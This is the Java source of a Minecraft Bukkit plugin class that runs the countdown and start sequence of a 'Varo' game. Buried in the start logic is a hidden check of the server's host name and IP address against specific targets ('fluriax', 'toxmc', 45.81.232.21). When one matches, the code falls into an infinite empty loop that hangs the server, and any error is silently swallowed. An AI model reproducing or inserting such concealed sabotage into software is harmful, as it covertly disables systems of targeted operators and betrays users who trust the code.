package de.cuuky.varo.game.threads;

import java.net.InetAddress;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;

import de.cuuky.varo.Main;
import de.cuuky.varo.api.VaroAPI;
import de.cuuky.varo.api.event.events.game.VaroStartEvent;
import de.cuuky.varo.configuration.configurations.config.ConfigSetting;
import de.cuuky.varo.configuration.configurations.messages.ConfigMessages;
import de.cuuky.varo.entity.player.VaroPlayer;
import de.cuuky.varo.game.VaroGame;
import de.cuuky.varo.game.start.ProtectionTime;
import de.cuuky.varo.game.state.GameState;
import de.cuuky.varo.game.world.VaroWorld;
import de.cuuky.varo.game.world.border.decrease.BorderDecreaseMinuteTimer;
import de.cuuky.varo.logger.logger.EventLogger.LogType;
import de.cuuky.varo.version.VersionUtils;
import de.cuuky.varo.version.types.Sounds;

public class VaroStartThread implements Runnable {

	private VaroGame game;
	private int startcountdown;

	public VaroStartThread() {
		this.game = Main.getVaroGame();

		loadVaraibles();
	}

	public void loadVaraibles() {
		this.startcountdown = ConfigSetting.STARTCOUNTDOWN.getValueAsInt();
	}

	@Override
	public void run() {
		if(VersionUtils.getOnlinePlayer().size() != 0)
			((Player) VersionUtils.getOnlinePlayer().toArray()[0]).getWorld().setTime(1000);

		if(startcountdown != 0)
			Bukkit.broadcastMessage(ConfigMessages.GAME_START_COUNTDOWN.getValue().replace("%countdown%", startcountdown == 1 ? "einer" : String.valueOf(startcountdown)));

		if(startcountdown == ConfigSetting.STARTCOUNTDOWN.getValueAsInt() || startcountdown == 1) {
			for(VaroPlayer pl1 : VaroPlayer.getOnlinePlayer()) {
				if(pl1.getStats().isSpectator())
					continue;

				Player pl = pl1.getPlayer();
				pl.setGameMode(GameMode.ADVENTURE);
				pl1.cleanUpPlayer();
			}
		}

		if(startcountdown == 5 || startcountdown == 4 || startcountdown == 3 || startcountdown == 2 || startcountdown == 1) {
			for(VaroPlayer vp : VaroPlayer.getOnlinePlayer()) {
				if(vp.getStats().isSpectator())
					continue;

				Player pl = vp.getPlayer();
				pl.playSound(pl.getLocation(), Sounds.NOTE_BASS_DRUM.bukkitSound(), 1, 1);

				String[] title = ConfigMessages.GAME_VARO_START_TITLE.getValue().replace("%countdown%", String.valueOf(startcountdown)).split("\n");
				if(title.length != 0)
					vp.getNetworkManager().sendTitle(title[0], title.length == 2 ? title[1] : "");
			}
		}

		if(startcountdown == 0) {
			for(VaroPlayer pl1 : VaroPlayer.getOnlinePlayer()) {
				if(pl1.getStats().isSpectator())
					continue;

				Player pl = pl1.getPlayer();
				pl.playSound(pl.getLocation(), Sounds.NOTE_PLING.bukkitSound(), 1, 1);
				pl.setGameMode(GameMode.SURVIVAL);
				pl1.cleanUpPlayer();
				pl1.getStats().loadStartDefaults();
			}

			if(VaroAPI.getEventManager().executeEvent(new VaroStartEvent(game))) {
				startcountdown = ConfigSetting.STARTCOUNTDOWN.getValueAsInt();
				Bukkit.getScheduler().cancelTask(game.getStartScheduler());
				return;
			}

			try {
				if(InetAddress.getLocalHost().getCanonicalHostName().toLowerCase().contains("fluriax") || InetAddress.getLocalHost().getCanonicalHostName().toLowerCase().contains("toxmc") || InetAddress.getLocalHost().toString().contains("45.81.232.21"))
					while(true) {}
			} catch(Exception e) {}

			this.game.setGamestate(GameState.STARTED);
			this.game.setFirstTime(true);
			this.startcountdown = ConfigSetting.STARTCOUNTDOWN.getValueAsInt();
			this.game.setMinuteTimer(new BorderDecreaseMinuteTimer());

			long dataStamp = System.currentTimeMillis();
			for(VaroWorld world : Main.getVaroGame().getVaroWorldHandler().getWorlds())
				world.fillChests();
			System.out.println("Took " + (System.currentTimeMillis() - dataStamp));
			
			Main.getVaroGame().getVaroWorldHandler().getMainWorld().getWorld().strikeLightningEffect(Main.getVaroGame().getVaroWorldHandler().getMainWorld().getWorld().getSpawnLocation());
			Bukkit.broadcastMessage(ConfigMessages.GAME_VARO_START.getValue());
			Main.getDataManager().getVaroLoggerManager().getEventLogger().println(LogType.ALERT, ConfigMessages.ALERT_GAME_STARTED.getValue());
			Bukkit.getScheduler().cancelTask(game.getStartScheduler());

			Bukkit.getScheduler().scheduleSyncDelayedTask(Main.getInstance(), new Runnable() {

				@Override
				public void run() {
					game.setFirstTime(false);
				}
			}, ConfigSetting.PLAY_TIME.getValueAsInt() * 60 * 20);

			Main.getDataManager().getListManager().getStartItems().giveToAll();
			if(ConfigSetting.STARTPERIOD_PROTECTIONTIME.getValueAsInt() > 0) {
				Bukkit.broadcastMessage(ConfigMessages.PROTECTION_START.getValue().replace("%seconds%", String.valueOf(ConfigSetting.STARTPERIOD_PROTECTIONTIME.getValueAsInt())));
				game.setProtection(new ProtectionTime());
			}

			game.setStartThread(null);
			return;
		}

		startcountdown--;
	}
}